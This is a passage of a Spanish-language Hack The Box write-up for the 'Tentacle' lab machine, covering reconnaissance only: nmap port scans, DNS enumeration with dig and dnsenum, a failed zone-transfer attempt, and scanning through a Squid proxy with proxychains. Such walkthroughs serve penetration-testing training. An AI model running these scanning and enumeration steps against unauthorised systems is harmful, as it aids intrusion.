@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sergiky">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://sergiky.github.io/2025/06/12/tentacle/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="En esta máquina vamos a navegar por diferentes Squid proxies para acabar encontrando un servicio vulnerable del cuál nos aprovecharemos para obtener acceso al sistema y posteriormente escalar privileg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="🐙 Tentacle | WriteUp">
+<meta property="og:url" content="https://sergiky.github.io/2025/06/12/Tentacle/index.html">
+<meta property="og:site_name" content="Sergiky">
+<meta property="og:description" content="En esta máquina vamos a navegar por diferentes Squid proxies para acabar encontrando un servicio vulnerable del cuál nos aprovecharemos para obtener acceso al sistema y posteriormente escalar privileg">
+<meta property="og:locale" content="es_ES">
+<meta property="og:image" content="https://sergiky.github.io/images/sergiky.webp">
+<meta property="article:published_time" content="2025-06-11T22:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-12T12:26:37.515Z">
+<meta property="article:author" content="Sergio Guijarro">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="eCPPTv2">
+<meta property="article:tag" content="eCPTXv2">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="high">
+<meta property="article:tag" content="dns_enumeration">
+<meta property="article:tag" content="squid_proxy">
+<meta property="article:tag" content="kerberos">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="dnsenum">
+<meta property="article:tag" content="kerbrute">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sergiky.github.io/images/sergiky.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/letter-s-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/letter-s-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/letter-s-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            🐙 Tentacle | WriteUp | Sergiky
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sergiky.github.io","root":"/","language":"es","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"20px","line_height":1.5,"image_border_radius":"20px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":false,"pangu_js":false,"recommendation":{"enable":true,"title":"Artículos recomendados","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1400px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/sergiky.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/black.gif","dark":"/images/black.gif"},"title":"<div class=\"social-contacts px-6 py-3 bg-gray-300/50 dark:bg-gray-500/40 backdrop-blur-lg border border-white/20 dark:border-gray-500/30 shadow-redefine-flat rounded-3xl flex flex-row gap-3 items-center\"> <span>✧Sergiky World✧</span> </div>","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/sergiky"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"CTF":{"path":"/categories/ctf","icon":"fa-regular fa-archive","submenus":{"Labs":"/categories/ctf/labs","TryHackMe":"/categories/ctf/tryhackme","Hack The Box":"/categories/ctf/hackthebox"}},"Whoami":{"icon":"fa-regular fa-user","path":"/whoami"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}}};
+    window.lang_ago = {"second":"Hace %s segundos","minute":"Hace %s minutos","hour":"Hace %s horas","day":"Hace %s días","week":"Hace %s semanas","month":"Hace %s meses","year":"Hace %s años"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Sergiky
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    CTF
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/categories/ctf/labs">
+                                                    LABS
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/categories/ctf/tryhackme">
+                                                    TRYHACKME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/categories/ctf/hackthebox">
+                                                    HACK THE BOX
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/whoami"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    WHOAMI
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-CTF"
+                        >
+                            <span>
+                                CTF
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-CTF">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories/ctf/labs">LABS</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories/ctf/tryhackme">TRYHACKME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories/ctf/hackthebox">HACK THE BOX</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/whoami"
+                        >
+                            <span>
+                                WHOAMI
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">54</div>
+        <div class="label text-third-text-color text-sm">Etiquetas</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categorías</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Publicaciones</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="https://sergiky.github.io/2025/06/11/Tentacle/cover-image.webp" alt="🐙 Tentacle | WriteUp" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">🐙 Tentacle | WriteUp</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/letter-s-favicon.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Sergiky</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-06-12</span>
+        <span class="mobile">2025-06-12</span>
+        <span class="hover-info">Creado</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-06-12 14:26:37</span>
+            <span class="mobile">2025-06-12 14:26:37</span>
+            <span class="hover-info">Actualizado</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/ctf/hackthebox/">hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/eCPPTv2/">eCPPTv2</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/eCPTXv2/">eCPTXv2</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/htb/">htb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/high/">high</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dns-enumeration/">dns_enumeration</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/squid-proxy/">squid_proxy</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/kerberos/">kerberos</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/OSCP/">OSCP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dnsenum/">dnsenum</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/kerbrute/">kerbrute</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>En esta máquina vamos a navegar por diferentes Squid proxies para acabar encontrando un servicio vulnerable del cuál nos aprovecharemos para obtener acceso al sistema y posteriormente escalar privilegios abusando de kerberos.</p>
+<h1 id="Organizacion"><a href="#Organizacion" class="headerlink" title="Organización"></a>Organización</h1><p>Nos creamos nuestro directorio de trabajo para ordenar todas las fases realizadas en esta intrusión.</p>
+<p>En mi caso tengo un script llamado <strong>mkt</strong> nivel de .zshrc que me permite crear la estructura de trabajo correspondiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mkt</span></span> () &#123;</span><br><span class="line">        <span class="built_in">mkdir</span> &#123;recog,play,data&#125;</span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="subst">$(pwd | awk -F <span class="string">&quot;/&quot;</span> &#x27;&#123;print $NF&#125;&#x27;)</span>-write-up.md&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><p>Empezamos con el patrón típico al enfrentarnos a una máquina, comprobaremos si dicha máquina nos responde a una traza ICMP para ver si está activa.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 10.10.10.224</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/ping_main_ip.png" alt="Comprobando si el equipo esta activo."><figcaption>Comprobando si el equipo esta activo.</figcaption></figure></p>
+<p>Recordar que si el TTL no se ha modificado cada sistema operativo tiene uno diferente, ya solo con un simple ping tenemos un indicio de que esta máquina es Linux. Más cerca de 64 Linux, cerca de 128 Windows, más información en <a class="link"   target="_blank" rel="noopener" href="https://subinsb.com/default-device-ttl-values/" >subinsb.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+<p>Procedemos con el típico escaneo de nmap de ‘to’ la vida.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate 4500 -vvv -n -Pn 10.10.10.224 -oG allPorts</span><br></pre></td></tr></table></figure></div>
+
+<p>En este escaneo yo indico que se esta haciendo un <strong>-sS</strong>(Syn Scan) para dejarlo más claro, pero por defecto cuando se utiliza nmap con privilegios de administrador se utiliza este escaneo, si no se utiliza sT(Syn TCP).</p>
+<p>Si utilizamos la herramienta extractPorts(creada por s4vitar) para extraer estos puertos en un formato más legible. Ojo en lugar de utilizar la utilidad xclip utilizo wl-copy.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">extractPorts</span></span> () &#123;</span><br><span class="line">        ports=<span class="string">&quot;<span class="subst">$(cat $1 | grep -oP &#x27;\d&#123;1,5&#125;/open&#x27; | awk &#x27;&#123;print $1&#125;&#x27; FS=&#x27;/&#x27; | xargs | tr &#x27; &#x27; &#x27;,&#x27;)</span>&quot;</span> </span><br><span class="line">        ip_address=<span class="string">&quot;<span class="subst">$(cat $1 | grep -oP &#x27;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&#x27; | sort -u | head -n 1)</span>&quot;</span> </span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\n[*] Extracting information...\n&quot;</span> &gt; extractPorts.tmp</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\t[*] IP Address: <span class="variable">$ip_address</span>&quot;</span> &gt;&gt; extractPorts.tmp</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\t[*] Open ports: <span class="variable">$ports</span>\n&quot;</span> &gt;&gt; extractPorts.tmp</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$ports</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | wl-copy</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;[*] Ports copied to clipboard\n&quot;</span> &gt;&gt; extractPorts.tmp</span><br><span class="line">        bat extractPorts.tmp</span><br><span class="line">        <span class="built_in">rm</span> extractPorts.tmp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/extractPorts_main.png" alt="Extracción de puertos a la clipboard con extractPorts."><figcaption>Extracción de puertos a la clipboard con extractPorts.</figcaption></figure></p>
+<p>Con los puertos escaneados podemos tratar de lanzar unos scripts básicos de enumeración y reconocmiento para ver con que nos vamos a pelear.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p22,53,88,3128 10.10.10.224 -oN targeted</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/nmap_enumeration_and_version_scripts_main.png" alt="Información obtenida gracias a los scripts de nmap."><figcaption>Información obtenida gracias a los scripts de nmap.</figcaption></figure></p>
+<p>¿Qué estamos viendo?</p>
+<ul>
+<li>Servicio ssh disponible, versión OpenSSH 8.0, no mucho por hacer aquí de momento.</li>
+<li>Servicio dns: Podemos enumerar información y intentar hacer un axfr(ataque de transferencia de zona)</li>
+<li>Servicio kerberos. Se me ocurre enumeración de usuarios por fuerza bruta, pero vamos a seguir avanzando.</li>
+<li>Servicio squid proxy. Vemos que dispone de un header y title, interesante.</li>
+<li>Service Info: Host: REALCORP.HTB -&gt; El encabezado Host nos indica el nombre de un dominio.</li>
+</ul>
+<p><strong>Virtual Hosting</strong>: Un servidor puede tener puede servir múltiples sitios web diferentes con solo una IP.</p>
+<p>En la configuración de algunos servidores web esperan un nombre de dominio o subdominio en lugar de una IP, por eso lo añadimos al fichero fichero &#x2F;etc&#x2F;hosts que asocia el nombre con la IP indicada.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.224 REALCORP.HTB</span><br></pre></td></tr></table></figure></div>
+
+<p>Vamos a echarle un primer vistazo al servicio web del squid proxy. Nos metemos a un navegador web e inspeccionamos la página(podemos acceder a ella mediante 10.10.10.224 o realcorp.htb)</p>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/first_view_web_squid_proxy.png" alt="Vistazo web del squid proxy."><figcaption>Vistazo web del squid proxy.</figcaption></figure></p>
+<p>Aquí podemos apreciar información de utilidad como un correo electrónico del “cache administrator”(un correo con el nombre de un usuario y el dominio empresarial.) También un poquito más abajo nos encontramos que este error ha sido generado por “srv01.realcorp.htb” lo que parece ser el nombre del servidor que esta alojando este servicio entre otros. Lo añadiremos también al fichero &#x2F;etc&#x2F;hosts.</p>
+<p>Ah recomiendo documentar todas las pruebas encontradas correos, servicios… Puede que nos haga falta posteriormente.</p>
+<h2 id="Enumeracion-dns"><a href="#Enumeracion-dns" class="headerlink" title="Enumeración dns"></a>Enumeración dns</h2><p>Vemos que el servicio dns está disponible, así que vamos a realizar una enumeración básica para ver que podemos obtener.</p>
+<p>Realizamos una consulta dns básica al servidor para ver con que nos responde:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.10.224 realcorp.htb</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/dig_basic.png" alt="Consulta dns estándar."><figcaption>Consulta dns estándar.</figcaption></figure></p>
+<p>No podemos sacar gran información de aquí aunque se puede ver un <strong>root.realcorp.htb</strong>, lo tendremos en cuenta y seguimos con la enumeración.</p>
+<p>Pedimos información sobre los name server:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.10.224 realcorp.htb ns</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/dig_ns.png" alt="Obtención de información sobre los name server."><figcaption>Obtención de información sobre los name server.</figcaption></figure></p>
+<p>Encontramos <strong>ns.realcorp.htb</strong> con un registro A con la IP 10.197.243.77. Mmm curioso, una IP a la que no podemos llegar de momento por el segmento de red donde estamos situados.</p>
+<p>Seguimos enumerando, vamos los “mail server” </p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.10.224 realcorp.htb mx</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/dig_mx.png" alt="Enumeración de los servidores de correo."><figcaption>Enumeración de los servidores de correo.</figcaption></figure></p>
+<p>Volvemos a ver root.realcorp.htb</p>
+<h3 id="Ataque-de-transferencia-de-zona"><a href="#Ataque-de-transferencia-de-zona" class="headerlink" title="Ataque de transferencia de zona"></a>Ataque de transferencia de zona</h3><p>Vamos a probar a realizar una ataque de transferencia de zona para obtener todos los registros DNS del dominio.</p>
+<p>Para ello ejecutamos el siguiente comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.10.224 realcorp.htb axfr</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/dig_axfr.png" alt="Intento fallido de ataque de transferencia de zona."><figcaption>Intento fallido de ataque de transferencia de zona.</figcaption></figure></p>
+<h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>Con la herramienta dnsenum vamos a realizar fuerza bruta para intentar enumerar subdominios a través del DNS.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --dnsserver 10.10.10.224 --thread 50 -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt real</span><br><span class="line">corp.htb</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img src="/2025/06/12/Tentacle/dnsenum_bruteforce_subdomain.png" alt="Enumeración de subdominios."><figcaption>Enumeración de subdominios.</figcaption></figure></p>
+<p>Podemos ver que encontramos más subdominios: <strong>proxy.realcorp.htb</strong> con la ip <strong>10.197.243.77</strong> y <strong>wpad.realcorp.htb</strong> con <strong>10.197.243.31</strong>.</p>
+<p>Recopilamos, tenemos lo siguiente:</p>
+<ul>
+<li>root.realcorp.htb</li>
+<li>10.197.243.77 ns.realcorp.htb </li>
+<li>10.197.243.77 proxy.realcorp.htb</li>
+<li>10.197.243.31 wpad.realcorp.htb</li>
+</ul>
+<p>Vamos a meterlo todo al archivo &#x2F;etc&#x2F;hosts excepto el root.realcorp.htb</p>
+<p>¿Cómo podemos llegar a dichas IPs?… ¿Y si intentamos usar el squid proxy?</p>
+<h2 id="Enumeracion-Squid-Proxy"><a href="#Enumeracion-Squid-Proxy" class="headerlink" title="Enumeración Squid Proxy"></a>Enumeración Squid Proxy</h2><p>¿Cómo enumeramos un squid proxy? ¿Qué podemos hacer con él?</p>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <i class="notel-icon fa-solid fa-info-circle"></i><p>Objetivos a probar con el squid proxy</p>
+
+    </div>
+    <div class="notel-content">
+      <ul>
+<li>Checkear si podemos ver algún puerto que no se pueda ver desde el exterior.</li>
+<li>Comprobar si podemos alcanzar alguna IP obtenida anteriormente.</li>
+<li>Probar a alcanzar alguna IP vista anteriormente utilizando la tarjeta de red interna en lugar de la externa.</li>
+</ul>
+
+    </div>
+  </div>
+
+<p>Bien, para ello vamos a utilizar <strong>proxychains</strong> y su archivo de configuración <strong>&#x2F;etc&#x2F;proxychains.conf</strong> y vamos a añadir al final del todo la siguiente línea:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http    10.10.10.224 3128</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Descubrir-puertos-que-no-se-pueden-ver-desde-el-exterior"><a href="#Descubrir-puertos-que-no-se-pueden-ver-desde-el-exterior" class="headerlink" title="Descubrir puertos que no se pueden ver desde el exterior"></a>Descubrir puertos que no se pueden ver desde el exterior</h3><p>Con esto estamos indicando que queremos pasar por este proxy web para ver si encontramos algo más. La idea es mirar si existe <strong>algún servicio abierto que no podemos ver desde el exterior</strong>.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap -sT -vvv -n -Pn 127.0.0.1</span><br></pre></td></tr></table></figure></div>
+<p>Puedes ver los proxies por los que va pasando sin el parámetro <strong>-q</strong>.</p>
